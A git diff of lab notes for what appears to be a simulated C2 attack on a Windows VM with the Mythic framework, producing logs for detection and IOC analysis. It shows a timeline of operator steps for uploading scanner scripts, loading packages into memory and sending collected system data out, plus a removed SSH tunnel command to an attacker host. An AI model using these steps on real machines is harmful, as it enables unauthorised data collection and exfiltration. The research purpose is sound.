@@ -76,37 +76,42 @@
     - base64-encoded plain scripts
     - remove downloaded image (optional)
 
-- Data Exfiltration (C2 server terminal)
+- Attack Timeline (British Summer Time)
 
-    - extract system info to C2 server
-    
-        - On C2 Server:
-    
-            1. open the corresponding callback 
-            2. enter the following command
-                ```
-                upload
-                ```
-            3. send two python scripts to any folder
-            4. run a local server to receive package -- Flask server listen on port 8000
-                ```
-                python3 server.py
-                ```
+    ** Time in Target Windows System is one hour ahead **
+
+    - normal behaviour: 2025.4.22 14:17 
+    - attack behaviour: 2025.4.22 14:22
+
+        - install package: 2025.4.22 14:22
+        - (attack side) received callback: 2025.4.22 14.23
+        - (attack side) browser the disk space
+        - (attack side) upload script "SenScanner.py": upload to any writable folder (rejected for few times)
+            - find writable folder at: C:\Windows\Temp\
         
-        - On target windows:
-            0. download necessary libraries
+        - (attacj side) check from Mythic UI -- Files -- Uploads 
+        - upload site-packages from attack server to target system 2025.4.22 3:33 p.m
+
             ```
+            # download necessary libraries
             pip3 install -r requirements.txt
+            zip -r package.zip site-packages (cd to this python directory) 
+            # on callback terminal
+            load_module
+            # select the package.zip and name it with "packs" (take a while)
+            # check the libraries have been loaded into memory
+            list_module 
+            # the output will show "packs" 
+
+            # start the listening process
+            python3 server.py
+            # load script
+            load_script
+            # choose two scanner scripts: one by one each 2025.4.22 3:36 p.m
+            
             ```
-            1. open command console on target machine
-            ```
-            # for tunnel creation
-            ssh -N -f -L 8000:localhost:8000 {attack_user}@{attack_public_ip}
-            ```
-            2. choose one file every time
-            ```
-            python3 SysScanner.py
-            ```
+        - received collected info (20250422_151814_info.zip) --- 2025.4.22 16:18
+
 
 - Troubleshooting:
 
@@ -123,44 +128,17 @@
 
     - Collected Data Type:
 
-        - Event (include all types of windows event logs)
-        - SecurityEvent
-        - VMConnection
+        - Event: This table includes all types of Windows Event Logs, like Application, System, and Setup logs.
 
-    - Timeline Track (British Summer Time):
-        - normal behaviour: 2025.4.22 14:17 
-        - attack behaviour: 2025.4.22 14:22
+        - SecurityEvent: Contains Windows Security Event Logs, often associated with auditing and security monitoring.
 
-            - install package: 2025.4.22 14:22
-            - (attack side) received callback: 2025.4.22 14.23
-            - (attack side) browser the disk space
-            - (attack side) upload script "SenScanner.py": upload to any writable folder (rejected for few times)
-                - find writable folder at: C:\Windows\Temp\
-            
-            - (attacj side) check from Mythic UI -- Files -- Uploads 
-            - upload site-packages from attack server to target system 2025.4.22 3:33 p.m
-
-                ```
-                # download necessary libraries
-                pip3 install -r requirements.txt
-                zip -r package.zip site-packages (cd to this python directory) 
-                # on callback terminal
-                load_module
-                # select the package.zip and name it with "packs" (take a while)
-                # check the libraries have been loaded into memory
-                list_module 
-                # the output will show "packs" 
-
-                # start the listening process
-                python3 server.py
-                # load script
-                load_script
-                # choose two scanner scripts: one by one each 2025.4.22 3:36 p.m
-                
-                ```
-            - received collected info (20250422_151814_info.zip) --- 2025.4.22 16:18
-
-        ** Target Windows System Time is one hour in advance **
+        - VMConnection: Tracks network connections to/from the VM
+        
+        - Perf: Contains performance metrics like CPU, memory, disk I/O, and network usage collected from VMs
+        
+        - BoundPort: Logs information about network ports that are bound (i.e., listening) on a VM
+        
+        - Process: Contains data about processes running on the VM
 
     - PreProcessing
 
@@ -170,12 +148,10 @@
 
     - Analysis
 
-        
+        - monitor -> label -> sc1 -> ioc_match.ipynb
 
 
     - Involve Techniques (more detailed information can be found at attack_navigator.json):
     
-        - T1030	Data Transfer Size Limits
-        - T1105	Ingress Tool Transfer
-        - T1132	Data Encoding
-        ...
+        - attack_navigator_cmds
+        - attack_navigator_tasks
